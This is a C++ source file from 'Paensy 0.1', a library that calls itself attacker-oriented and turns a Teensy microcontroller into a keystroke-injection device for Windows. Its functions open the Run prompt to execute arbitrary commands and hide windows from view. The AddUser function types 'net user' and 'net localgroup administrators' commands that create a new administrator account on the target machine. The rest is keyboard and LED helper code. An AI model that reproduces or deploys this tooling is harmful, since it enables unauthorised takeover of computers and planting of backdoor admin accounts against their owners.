/***
 *    ______                            _____  __  
 *    | ___ \                          |  _  |/  | 
 *    | |_/ /_ _  ___ _ __  ___ _   _  | |/' |`| | 
 *    |  __/ _` |/ _ \ '_ \/ __| | | | |  /| | | | 
 *    | | | (_| |  __/ | | \__ \ |_| | \ |_/ /_| |_
 *    \_|  \__,_|\___|_| |_|___/\__, |  \___(_)___/
 *                               __/ |             
 *                              |___/              
 *     _             _____                         
 *    | |           |  _  |                        
 *    | |__  _   _  | | | |_____   _ _ __ _   _    
 *    | '_ \| | | | | | | |_  / | | | '__| | | |   
 *    | |_) | |_| | \ \_/ // /| |_| | |  | |_| |   
 *    |_.__/ \__, |  \___//___|\__,_|_|   \__,_|   
 *            __/ |                                
 *           |___/                                 
 *
 *
 * This is Paensy 0.1 by Ozuru. Paensy is an attacker-oriented library for the Teensy 3.1 microcontroller.
 *
 * If you have any questions, feel free to open a ticket on the GitHub repository.
 *
 * Instructions: place paensy.cpp and paensy.h inside Arduino\libraries\PaensyLib\.
 *
 * To utilize the library, add #include <paensy.h> to the top of your file.
 *
 * http://www.malware.cat/ is my personal website and cyber-security oriented blog - check it out if you enjoy this!
 *
 */

#include "WProgram.h"
#include "paensy.h"

int delayAm;
int morseDelay;
int LED_PIN;

/**
 * Sets the delay. Almost every task scales off of the delay so be sure to play around with this. 100 works well for me.
 **/
void SetDelay(int _delayAm) {
    delayAm = _delayAm;
}

/**
 * Sets the Morse code delay. This is a matter of personal preference. 250 works well for me.
 **/
void SetMorseDelay(int _morseDelay) {
    morseDelay = _morseDelay;
}

/**
 * Sets the LED pin number.
 *
 * Defaults:
 *
 * 3.1 - pin 13
 * 2.0 - pin 11
 * 1.0, 1.0++, and 2.0++ - pin 6
 **/
void SetLEDPin(int _LED_PIN) {
    LED_PIN = _LED_PIN;
}

/**
 * Returns the delay.
 **/
int GetDelay() {
    return delayAm;
}

/**
 * Returns the Morse delay.
 **/
int GetMorseDelay() {
    return morseDelay;
}

/**
 * Returns the LED pin number.
 **/
int GetLEDPin() {
    return LED_PIN;
}

/**
 * Performs the initial delay. I find that it's required to give the microcontroller time to boot up and get itself situated.
 * I personally keep it at 60, feel free to change that if it feels too absurd.
 **/
void PerformInitDelay() {
    delay(delayAm * 30);
}
/**
 * Opens the run prompt and executes whatever *command is.
 **/
void RunCommand(char *command) {
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the GUI (Windows) key
    delay(delayAm * 1.5);
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
    delay(delayAm*2.2);
    Keyboard.print(command);
    Keyboard.set_key1(KEY_ENTER); 
    Keyboard.send_now();
    delay(delayAm*1.5);
    Keyboard.set_key1(0); 
    Keyboard.send_now();
    delay(delayAm);
}

/**
 * Hides the current window. 
 * An input of screen height is taken and divided by a constant value to determine how many times to press the down arrow.
 **/
void HideCurWindow(int screenHeight) {
    Alt(KEY_SPACE);
    PressKey(KEY_M, 1);
    PressKey(KEY_DOWN, ((int)(screenHeight/7.2)));
    Mouse.click();
    delay(delayAm);
}

/**
 * Creates a new account and adds the user to administrator.
 * Closes the window after modification.
 **/
void AddUser(String uname, String pword) {
    TypeLn("net user " + uname + " /add");
    TypeLn("net localgroup administrators " + uname + " /add");
    TypeLn("net user " + uname + " *");
    TypeLn(pword);
    TypeLn(pword); 
    TypeLn("exit");
}

/**
 * Presses a key as many times as specified.
 * PressKey(KEY_TAB, 10) would press the tab key 10 times.
 **/
void PressKey(int key, int amount) {
    for(int i = 0; i < amount; i++) {
        Keyboard.set_key1(key);
        Keyboard.send_now();
        Keyboard.set_key1(0);
        Keyboard.send_now();
        delay(delayAm/8);
    }
}

/**
 * Types out our input and then hits enter.
 **/
void TypeLn(String chars) {
    Keyboard.print(chars);
    delay(delayAm/2);
    Keyboard.println("");
    delay(delayAm/2);
}

/**
 * Allows alt key combinations.
 * Example: Alt(KEY_ESC) would simulate pressing the escape key while holding alt.
 **/
void Alt(int key) {
    Keyboard.set_modifier(MODIFIERKEY_ALT); // Alt key
    Keyboard.set_key1(key);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the key
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
}

/**
 * Allows control key combinations.
 * Example: Ctrl(KEY_ALT) would simulate pressing the alt key while holding control.
 **/
void Ctrl(int key) {
    Keyboard.set_modifier(MODIFIERKEY_CTRL); // Control key
    Keyboard.set_key1(key);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the key
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
}

/**
 * Allows shift key combinations.
 * Example: Shift(KEY_ESC) would simulate pressing the escape key while holding shift.
 **/
void Shift(int key) {
    Keyboard.set_modifier(MODIFIERKEY_SHIFT); // Shift key
    Keyboard.set_key1(key);
    Keyboard.send_now(); // Send keys to the system
    Keyboard.set_modifier(0); // Release the key
    Keyboard.set_key1(0); // No key
    Keyboard.send_now(); // Send the key change
}

/**
 * Makes the LED do a Morse code dot.
 **/
void LED_MorseDot() {
    digitalWrite(LED_PIN, HIGH);
    delay(morseDelay);
    digitalWrite(LED_PIN, LOW);
    delay(morseDelay);
}

/**
 * Makes the LED do a Morse code dash.
 **/
void LED_MorseDash() {
    digitalWrite(LED_PIN, HIGH);
    delay(morseDelay * 3);
    digitalWrite(LED_PIN, LOW);
    delay(morseDelay);
}

/**
 * Turns a LED on and off with a configurable delay and a configurable amount of times.
 * Example: LED_Flutter(200, 10) would cause the LED to alternate with a 200 millisecond delay 10 times, or turn on and off for 2 seconds every 200 milliseconds.
 **/
void LED_Flutter(int fDelay, int fAmount) {
    for(int i = 0; i < fAmount; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(fDelay);
        digitalWrite(LED_PIN, LOW);
        delay(fDelay);
    }
}